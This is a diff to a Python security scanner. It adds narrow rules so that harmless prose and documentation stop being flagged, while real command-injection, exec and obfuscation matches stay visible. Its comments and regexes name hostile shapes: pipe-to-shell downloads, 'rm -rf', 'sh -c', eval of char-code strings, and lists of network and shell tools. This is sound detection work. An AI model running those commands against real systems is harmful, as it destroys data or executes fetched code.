@@ -1523,9 +1523,7 @@ def _is_inert_insecure_tls_doc(
 # and a JWT TOKEN LITERAL (``eyJ…eyJ…``). A committed secret / token is a real
 # exposure regardless of the surrounding markdown, so those sub-patterns are
 # NEVER suppressed here — only the inert config anti-patterns are.
-_JWT_LEAK_MATCH_RE: Final[re.Pattern[str]] = re.compile(
-    r"(?i)jwt[_-]?secret\s*[:=]|eyJ[A-Za-z0-9_-]{10,}\.eyJ"
-)
+_JWT_LEAK_MATCH_RE: Final[re.Pattern[str]] = re.compile(r"(?i)jwt[_-]?secret\s*[:=]|eyJ[A-Za-z0-9_-]{10,}\.eyJ")
 
 
 def _is_inert_jwt_vuln_doc(
@@ -1677,10 +1675,27 @@ _SHELL_INTERPRETER_ARGV0: Final[frozenset[str]] = frozenset(
 # separately-scanned target — stays certified, but ``python -c`` does not).
 _CODE_INTERPRETER_ARGV0: Final[frozenset[str]] = frozenset(
     {
-        "python", "python2", "python3", "pypy", "pypy3",
-        "node", "nodejs", "deno", "bun",
-        "perl", "ruby", "jruby", "php", "lua", "luajit",
-        "tclsh", "groovy", "elixir", "osascript", "rscript", "sed",
+        "python",
+        "python2",
+        "python3",
+        "pypy",
+        "pypy3",
+        "node",
+        "nodejs",
+        "deno",
+        "bun",
+        "perl",
+        "ruby",
+        "jruby",
+        "php",
+        "lua",
+        "luajit",
+        "tclsh",
+        "groovy",
+        "elixir",
+        "osascript",
+        "rscript",
+        "sed",
     }
 )
 # Inline-code-eval flags that mean "the following element is code to execute".
@@ -1742,7 +1757,7 @@ def _is_safe_literal_argv_subprocess(line: str) -> bool:
     for i, base in enumerate(basenames):
         if base in _SHELL_INTERPRETER_ARGV0:
             return False
-        if base in _CODE_INTERPRETER_ARGV0 and any(f in _INLINE_CODE_FLAG for f in raw[i + 1:]):
+        if base in _CODE_INTERPRETER_ARGV0 and any(f in _INLINE_CODE_FLAG for f in raw[i + 1 :]):
             return False
     return True
 
@@ -1875,9 +1890,7 @@ def _is_inert_backtick_command_list(line: str, match: str, rule_id: str) -> bool
 #
 # re2-safe (anchors + a plain char-class repetition, no lookaround).
 _PIPE_BARE_IDENT: Final[str] = r"[A-Za-z_][A-Za-z0-9_]*"
-_PIPE_ALTERNATION_RE: Final[re.Pattern[str]] = re.compile(
-    rf"^{_PIPE_BARE_IDENT}(?:\|{_PIPE_BARE_IDENT})+$"
-)
+_PIPE_ALTERNATION_RE: Final[re.Pattern[str]] = re.compile(rf"^{_PIPE_BARE_IDENT}(?:\|{_PIPE_BARE_IDENT})+$")
 
 
 def _is_inert_pipe_alternation(line: str, match: str, rule_id: str) -> bool:
@@ -1938,9 +1951,7 @@ def _is_inert_pipe_alternation(line: str, match: str, rule_id: str) -> bool:
 # ``cmd | sh`` (execute piped data — the actual ``curl … | sh`` danger) stays
 # visible. This is a MISCLASSIFICATION fix (``||`` read as ``|``), independent of
 # the executable-fence policy: ``|| sh`` is never a pipe regardless of context.
-_PIPE_TOOL_IN_MATCH_RE: Final[re.Pattern[str]] = re.compile(
-    r"\b(curl|wget|nc|bash|sh|python|perl|ruby|php)\b"
-)
+_PIPE_TOOL_IN_MATCH_RE: Final[re.Pattern[str]] = re.compile(r"\b(curl|wget|nc|bash|sh|python|perl|ruby|php)\b")
 
 
 def _is_logical_or_not_pipe(line: str, match: str, rule_id: str) -> bool:
@@ -2106,6 +2117,301 @@ def _is_inert_gha_toolchain_sudo_rm(
     return bool(_GHA_STEP_KEY_RE.search(fence_body))
 
 
+# ────────────────────────────────────────────────────────────────────────
+# A2 (TRDD-933592ac) — eight demoted-NIT doc/prose FALSE POSITIVES on the
+# amvcp plugin, each lifted from ``safe_doc`` (DEMOTE → NIT, which blocks
+# ``--strict``) to ``safe_literal`` (full SUPPRESS) ONLY where provably
+# inert. Every discriminator below was built against the EXACT substring the
+# real scanner matches (recorded via ``scan_content``), and every one is
+# FN-safe two-sided: the malicious sibling of the SAME rule keeps firing.
+# ────────────────────────────────────────────────────────────────────────
+
+# #A2 cases 1/2/6 — CMD_INJECTION fires on a prose ``;`` clause-separator. The
+# catalog shell-pipe heuristic ``(?:;|\||&&)\s*\b(?:…|python|sh|bash|curl|…)\b``
+# treats ``;`` as a shell command separator whenever a SHELL-TOOL NAME follows
+# it. But ``- Browser (Chromium for \`--app=URL\`); Python 3.12+ runner.`` is an
+# English Prerequisites clause — the matched substring is ``; Python`` and
+# ``Python`` is in the tool alternation purely because the runtime is named.
+#
+# A ``;`` is a real shell separator only when BOTH sides are command-shaped. The
+# inert proof inspects the RHS of the clause — the line text AFTER the matched
+# ``; <tool>`` token, up to the next ``;`` or end-of-line — and suppresses iff
+# the RHS carries NO command-argument token. A genuine instructed
+# ``foo; curl http://x | sh`` / ``x; sh -c '…'`` / ``y; python deploy.py prod``
+# is command-shaped → fails the gate → stays visible. FN-safe BY SHAPE, so it is
+# safe on a SKILL.md instruction surface too (Signal-0's intent is preserved:
+# a real command after ``;`` is never suppressed).
+#
+# A command-argument token in the RHS:
+#   * a ``-flag`` / ``--flag`` (``sh -c``, ``python -m``);
+#   * a script-extension filename (``deploy.py``, ``install.sh``, ``run.js`` …);
+#   * a URL (``http``/``https``);
+#   * a shell metacharacter (``|`` ``>`` ``<`` ``$(`` backtick ``&&`` ``;`` ``&``);
+#   * a path-glued slash (``/x`` or ``./x`` — a slash immediately followed by a
+#     NON-space char; a `` / `` surrounded by spaces is a prose list separator,
+#     NOT a path, so case 6's ``Python / TypeScript /`` stays inert).
+_PROSE_SEMI_TOOL_RE: Final[re.Pattern[str]] = re.compile(r";\s*(?P<tool>[A-Za-z][A-Za-z0-9_.+-]*)")
+# A command-argument token anywhere in the clause RHS → NOT a prose clause.
+_CLAUSE_RHS_COMMAND_TOKEN_RE: Final[re.Pattern[str]] = re.compile(
+    r"(?:"
+    r"(?<![\w-])--?[A-Za-z]"  # a -flag / --flag (not a mid-word hyphen)
+    r"|\b[\w.-]+\.(?:py|sh|bash|zsh|js|mjs|cjs|ts|rb|pl|php|ps1|bat|cmd|exe)\b"  # script-ext filename
+    r"|https?://"  # a URL
+    r"|[|<>&`]"  # shell metacharacter (pipe / redirect / and / backtick)
+    r"|\$\("  # command substitution
+    r"|(?<!\s)/\S|\./\S"  # path-glued slash (NOT a ` / ` prose list separator)
+    r")"
+)
+
+
+def _is_inert_prose_clause_separator(line: str, match: str, rule_id: str) -> bool:
+    """#A2 1/2/6 — True iff a CMD_INJECTION ``; <tool>`` match is an English
+    prose clause separator, not a shell command separator.
+
+    The match begins with ``;`` and the RHS of the clause (the line after the
+    matched ``; <tool>`` token, up to the next ``;`` / end) contains NO
+    command-argument token (no ``-flag``, no script-extension filename, no URL,
+    no shell metacharacter, no command substitution, no path-glued slash). A
+    real ``foo; curl … | sh`` / ``x; python deploy.py`` / ``y; sh -c '…'`` is
+    command-shaped on the RHS → declines → stays visible.
+
+    FN-safe by SHAPE (independent of the file surface), so the 2 SKILL.md cases
+    are cleared without weakening the Signal-0 guard: a genuine instructed
+    command after ``;`` is never matched.
+    """
+    if rule_id != "CMD_INJECTION":
+        return False
+    if not match.lstrip().startswith(";"):
+        return False
+    m = _PROSE_SEMI_TOOL_RE.search(match)
+    if m is None:
+        return False
+    tool = m.group("tool")
+    # Locate the matched ``; <tool>`` on the LINE, then read the clause RHS
+    # (after the tool token, up to the next ``;`` or end-of-line).
+    line_m = re.search(r";\s*" + re.escape(tool) + r"\b", line)
+    if line_m is None:
+        return False
+    rhs_start = line_m.end()
+    rest = line[rhs_start:]
+    next_semi = rest.find(";")
+    rhs = rest if next_semi < 0 else rest[:next_semi]
+    # Blank backtick inline-code spans in the RHS first: a backticked token is
+    # rendered monospace DOCUMENTATION text (a referenced script path
+    # ``\`scripts/x.py\``, a product name), never an executed command argument.
+    # A real injection's shell operators / bare filenames are NOT backticked
+    # (``; python deploy.py`` / ``; curl … | sh`` carry the dangerous token in
+    # bare text), so this only clears doc references and never a live command.
+    rhs = _BACKTICK_SPAN_RE.sub(" ", rhs)
+    # The RHS must carry no command-argument token to be certified inert prose.
+    return _CLAUSE_RHS_COMMAND_TOKEN_RE.search(rhs) is None
+
+
+# #A2 case 3 — SHELL_EXEC fires ``function (\``` on the markdown prose
+# ``- A cloud function (\`AWS Lambda\`, \`Cloudflare Worker\`).``. The catalog
+# pattern keys on the ``<word> function (`` shape and the matched substring is
+# ``function (\``` — INDEPENDENT of what the backtick holds (a real
+# ``function (\`rm -rf /tmp\`)`` matches the SAME substring and nothing else
+# catches the command). So the inert proof MUST inspect the backtick CONTENT:
+# suppress ONLY when the inline-code span immediately after ``function (`` holds
+# a Title-Case product NAME (``AWS Lambda``, ``Cloudflare Worker``) — letters,
+# digits, spaces, capitalised words — and NOT a shell-command shape. A backtick
+# carrying a command (``rm -rf …``, ``os.system(…)``, ``curl …``) fails the
+# product-name test → stays visible (FN-safe).
+_FUNCTION_BACKTICK_RE: Final[re.Pattern[str]] = re.compile(r"function\s*\(\s*`(?P<name>[^`]+)`")
+# A Title-Case product / service NAME: one or more capitalised words
+# (``AWS``, ``Lambda``, ``Cloudflare``, ``Worker``, ``GCP``, ``Azure`` …),
+# space-separated, letters/digits only — no shell metachar, no path, no flag,
+# no ``(``/``.`` call shape.
+_TITLECASE_PRODUCT_NAME_RE: Final[re.Pattern[str]] = re.compile(r"^[A-Z][A-Za-z0-9]*(?: [A-Z][A-Za-z0-9]*)*$")
+
+
+def _is_inert_backtick_product_name(line: str, match: str, rule_id: str) -> bool:
+    r"""#A2 3 — True iff a SHELL_EXEC ``function (\``` match names a cloud product
+    in an inline-code span — ``a cloud function (\`AWS Lambda\`)`` — not a real
+    function call wrapping a command.
+
+    The backtick span immediately following ``function (`` must hold a Title-Case
+    product NAME (``_TITLECASE_PRODUCT_NAME_RE``). A backtick carrying a shell
+    command (``function (\`rm -rf /tmp\`)``, ``function (\`os.system(x)\`)``) fails
+    the product-name test and STAYS visible — closing the FN hole that the
+    matched substring (``function (\```) alone cannot distinguish.
+    """
+    if rule_id != "SHELL_EXEC":
+        return False
+    if "function" not in match:
+        return False
+    m = _FUNCTION_BACKTICK_RE.search(line)
+    if m is None:
+        return False
+    name = m.group("name").strip()
+    return bool(_TITLECASE_PRODUCT_NAME_RE.match(name))
+
+
+# #A2 case 4 — REGEX_DOS fires on the prose count ``multiple groups (3+)``. The
+# matched substring is ``(3+)*`` — the catalog greedily captured the closing
+# ``*`` of the markdown bold ``**…(3+)**``. ``(<digit>+)`` means "N or more" in
+# English; it is NOT a catastrophic nested quantifier. The inert proof: the
+# group base is DIGITS-ONLY, the trailing quantifier char is a MARKDOWN EMPHASIS
+# delimiter (``*``/``_``) — the ``**`` bold closer or a ``*…*`` italic wrap —
+# and the match is NOT inside a fence. A genuine ``(a+)+`` (non-digit base),
+# ``(3+)+`` (digit base but a REAL outer ``+`` quantifier — the trailing char is
+# not an emphasis delimiter), ``(\d+)*`` / ``(7+)* token`` (a bare regex ``*``
+# with no markdown emphasis wrap) all fail and STAY visible. Fence-gated so a
+# real ``/(3+)*/`` regex literal inside a code fence still fires.
+_COUNT_QUANTIFIER_RE: Final[re.Pattern[str]] = re.compile(r"^\((?P<base>\d+)\+\)(?P<tail>[*_])$")
+
+
+def _is_inert_count_quantifier_prose(
+    fence_state: tuple[int, int, str] | None, line: str, match: str, rule_id: str
+) -> bool:
+    """#A2 4 — True iff a REGEX_DOS ``(N+)*`` match is the English count idiom
+    ``multiple groups (3+)`` wrapped in markdown emphasis, not a real regex.
+
+    ALL must hold (each a separate FN guard):
+      1. ``rule_id == "REGEX_DOS"`` and NOT inside any fence (a regex literal in
+         a ```js / ```python fence still fires), AND
+      2. the match is ``(\\d+)+`` with a trailing ``*`` / ``_`` the catalog
+         greedily grabbed (``_COUNT_QUANTIFIER_RE`` — base is DIGITS-ONLY, so
+         ``(a+)+`` declines), AND
+      3. that trailing ``*`` / ``_`` is a MARKDOWN EMPHASIS delimiter on the
+         line — either the second half of a ``**``/``__`` bold closer
+         (immediately followed by the same delimiter) OR a ``*…*``/``_…_``
+         italic wrap (a matching opener delimiter sits before the ``(`` group).
+
+    A real outer-quantifier ``(3+)+`` (trailing ``+`` → fails 2) or a bare regex
+    ``(7+)*`` with no emphasis wrap (fails 3) stays visible.
+    """
+    if rule_id != "REGEX_DOS":
+        return False
+    if fence_state is not None:
+        return False
+    qm = _COUNT_QUANTIFIER_RE.match(match)
+    if qm is None:
+        return False
+    closer = qm.group("tail")
+    idx = line.find(match)
+    if idx < 0:
+        return False
+    # (a) ``**…(N+)**`` bold — the captured ``*`` is immediately followed by a
+    #     second identical delimiter on the line (the ``**`` closer).
+    after = line[idx + len(match) :]
+    if after[:1] == closer:
+        return True
+    # (b) ``*(N+)*`` italic — a matching emphasis OPENER delimiter sits
+    #     immediately before the ``(`` of the group.
+    return idx > 0 and line[idx - 1] == closer
+
+
+# #A2 case 5 — SHELL_EXEC fires ``spawn(`` on a Rust ``tokio::spawn(refresh(key))``
+# sample displayed AS DATA inside a ```json/```jsonc slide-spec ``"source"``
+# string. ``tokio::spawn`` (and the other Rust async runtimes) spawn an async
+# TASK on the executor — they are NOT process spawn. The NARROW inert proof:
+# the ``spawn(`` match is immediately preceded by a Rust async-runtime path
+# (``tokio::`` / ``actix::`` / ``async_std::`` / ``smol::`` / ``glommio::``)
+# AND the match sits in a DATA-language fence (json/jsonc/yaml/yml/toml) in a
+# markdown file. This deliberately does NOT take the broad "data fence ⇒
+# suppress SHELL_EXEC" shortcut — a real ``os.system('curl|sh')`` /
+# ``child_process.spawn`` inside the same json string still fires (verified).
+_RUST_ASYNC_SPAWN_RE: Final[re.Pattern[str]] = re.compile(r"\b(?:tokio|actix|async_std|smol|glommio)::spawn\b")
+# A non-async execution SINK co-located on the same line. The case-5 match is the bare ``spawn(``
+# token and the suppression keys on the LINE holding a Rust async spawn — so without this guard a
+# real ``os.system('rm -rf /'); tokio::spawn(x)`` or a ``child_process.spawn(userInput)`` sharing
+# the line with a ``tokio::spawn`` would be wrongly suppressed (the SHELL_EXEC match may be the
+# SINK, not the async task spawn). If any competing sink shares the line, DECLINE — stay visible.
+# FN-safe: the real slide-spec sample (``tokio::spawn(refresh(key))``) carries no such sink. This
+# makes the code enforce what the docstring already promises. (orchestrator A2 verification —
+# caught a co-located-exec FN hole; TRDD-933592ac)
+_CASE5_COMPETING_EXEC_SINK_RE: Final[re.Pattern[str]] = re.compile(
+    r"\bos\.(?:system|popen|exec\w*)\s*\("
+    r"|\bsubprocess\.\w+\s*\("
+    r"|child_process"
+    r"|\bsystem\s*\("
+    r"|\bpopen\s*\("
+    r"|\bexec(?:v|l)[lvpe]*\s*\("
+    r"|Runtime\.getRuntime|ProcessBuilder"
+    r"|\|\s*(?:sh|bash|zsh|dash)\b"
+)
+
+
+def _is_inert_rust_async_spawn(fence_state: tuple[int, int, str] | None, line: str, match: str, rule_id: str) -> bool:
+    """#A2 5 — True iff a SHELL_EXEC ``spawn(`` match is a Rust async-task spawn
+    (``tokio::spawn(…)``) shown as DATA inside a json/yaml/toml fence.
+
+    NARROW by construction (NOT a blanket data-fence shortcut): the ``spawn``
+    must be qualified by a Rust async runtime path (``tokio::``/``actix::``/…)
+    AND the enclosing fence must be a DATA language. A real ``os.system`` /
+    ``child_process.spawn`` / ``curl|sh`` in the same json string is unqualified
+    → declines → stays visible; ``tokio::spawn`` in a ```bash fence (executable)
+    also declines.
+    """
+    if rule_id != "SHELL_EXEC":
+        return False
+    if fence_state is None or fence_state[2] not in _DATA_LANGS:
+        return False
+    if not _RUST_ASYNC_SPAWN_RE.search(line):
+        return False
+    # A competing non-async exec sink on the same line means the matched ``spawn(`` may be that
+    # sink, not the async task spawn — decline so the real threat stays visible (FN-safe).
+    if _CASE5_COMPETING_EXEC_SINK_RE.search(line):
+        return False
+    return True
+
+
+# #A2 cases 7/8 — INSECURE_CRYPTO (``Math.random()``) and OBFUSCATION
+# (``String.fromCharCode(…)``) in an inline-code span inside a prose ANTI-PATTERN
+# bullet. INSECURE_CRYPTO is already in ``_DOC_INLINE_CODE_SUPPRESSED_RULES`` but
+# its case-7 match (``key placement (using \`Math.random()``) SPILLS the regex
+# capture out of the backtick span, so ``_match_falls_inside_inline_code`` is
+# False. OBFUSCATION is not in that set at all (case 8 matches ``String.fromCharCode(``
+# fully inside a backtick span). The inert proof: a NON-execution-class doc rule
+# whose RULE SIGNATURE (the call token) sits ENTIRELY inside a backtick inline-code
+# span on a prose line — even when the regex over-captured leading/trailing prose.
+# Fence-gated to prose: a real ``Math.random()`` / ``eval(String.fromCharCode(…))``
+# inside a ```js fence has no markdown backtick span → declines → stays visible.
+_A2_INLINE_DOC_RULES: Final[frozenset[str]] = frozenset({"INSECURE_CRYPTO", "OBFUSCATION"})
+# The bare call signature each rule reduces to (the substring that MUST be inside
+# the backtick span for the match to be an inert documentation mention).
+_A2_RULE_SIGNATURE_RE: Final[dict[str, re.Pattern[str]]] = {
+    "INSECURE_CRYPTO": re.compile(r"Math\.random\s*\("),
+    "OBFUSCATION": re.compile(r"String\.fromCharCode\s*\("),
+}
+
+
+def _is_inert_inline_code_doc_signature(
+    fence_state: tuple[int, int, str] | None, line: str, match: str, rule_id: str
+) -> bool:
+    """#A2 7/8 — True iff an INSECURE_CRYPTO / OBFUSCATION match's call SIGNATURE
+    sits entirely inside a markdown backtick inline-code span on a prose line.
+
+    Handles the spill case (the regex over-captured surrounding prose, so the
+    whole ``match`` is not inside the span — case 7) by checking the rule's bare
+    call signature (``Math.random(`` / ``String.fromCharCode(``) against the
+    inline-code spans directly. Fence-gated: only fires outside any fence (a
+    real call inside a ```js fence has no inline-code span → declines).
+
+    FN-safe: a real ``const k = Math.random();`` / ``eval(String.fromCharCode(…))``
+    in a ```js fence stays visible (no backtick span → no signature inside a span).
+    """
+    if rule_id not in _A2_INLINE_DOC_RULES:
+        return False
+    if fence_state is not None:
+        return False
+    sig_re = _A2_RULE_SIGNATURE_RE.get(rule_id)
+    if sig_re is None:
+        return False
+    if sig_re.search(match) is None and sig_re.search(line) is None:
+        return False
+    # The signature must occur ONLY inside backtick spans on the line: blank
+    # every span and confirm the signature is gone from the bare prose (so a
+    # bare-prose ``Math.random()`` with no backticks does NOT get suppressed).
+    bare = _BACKTICK_SPAN_RE.sub(" ", line)
+    if sig_re.search(bare):
+        return False
+    # And it must actually appear inside at least one span.
+    return any(sig_re.search(s) for s in _BACKTICK_SPAN_RE.findall(line))
+
+
 def _certain_benign_literal(
     line: str,
     lines: list[str],
@@ -2219,6 +2525,46 @@ def _certain_benign_literal(
     #       ```bash``` fence / `.sh` ALL stay visible. Cannot widen into a
     #       `sudo rm` bypass.
     if _is_inert_gha_toolchain_sudo_rm(fence_state, lines, line, rule_id):
+        return True
+
+    # (#A2 1/2/6) CMD_INJECTION on a prose ``;`` clause separator
+    #       (``…\`--app=URL\`); Python 3.12+ runner.``). The matched ``; <tool>``
+    #       is an English Prerequisites clause whose RHS carries no command
+    #       argument. A real ``foo; curl … | sh`` / ``x; python deploy.py`` is
+    #       command-shaped on the RHS and stays visible. FN-safe by shape, so it
+    #       clears the 2 SKILL.md cases without weakening Signal-0.
+    if _is_inert_prose_clause_separator(line, match, rule_id):
+        return True
+
+    # (#A2 3) SHELL_EXEC ``function (\``` naming a cloud product in inline-code
+    #       (``a cloud function (\`AWS Lambda\`)``). Suppressed ONLY when the
+    #       backtick holds a Title-Case product NAME; a backtick carrying a real
+    #       command (``function (\`rm -rf /tmp\`)``) fails the test and fires.
+    if _is_inert_backtick_product_name(line, match, rule_id):
+        return True
+
+    # (#A2 4) REGEX_DOS on the English count idiom ``multiple groups (3+)``
+    #       wrapped in markdown emphasis (``**…(3+)**`` / ``*(5+)*``). Base is
+    #       digits-only and the trailing ``*``/``_`` is an emphasis delimiter; a
+    #       real ``(a+)+`` / ``(3+)+`` / bare ``(7+)*`` regex stays visible, and a
+    #       regex literal inside a code fence is fence-gated out.
+    if _is_inert_count_quantifier_prose(fence_state, line, match, rule_id):
+        return True
+
+    # (#A2 5) SHELL_EXEC ``spawn(`` on a Rust ``tokio::spawn(…)`` async-task
+    #       sample shown as DATA inside a json/yaml/toml fence. NARROW: must be
+    #       a Rust async-runtime path inside a data fence; ``os.system`` /
+    #       ``child_process.spawn`` / ``curl|sh`` in the same json string, and
+    #       ``tokio::spawn`` in a ```bash``` fence, all stay visible.
+    if _is_inert_rust_async_spawn(fence_state, line, match, rule_id):
+        return True
+
+    # (#A2 7/8) INSECURE_CRYPTO ``Math.random()`` / OBFUSCATION
+    #       ``String.fromCharCode(…)`` whose call SIGNATURE sits inside a backtick
+    #       inline-code span on a prose line (even when the regex over-captured
+    #       surrounding prose — case 7's spill). Fence-gated: a real call inside a
+    #       ```js fence has no backtick span → declines → stays visible.
+    if _is_inert_inline_code_doc_signature(fence_state, line, match, rule_id):
         return True
 
     # (1) CRYPTO_THEFT "mnemonic" with NO crypto-wallet vocabulary in
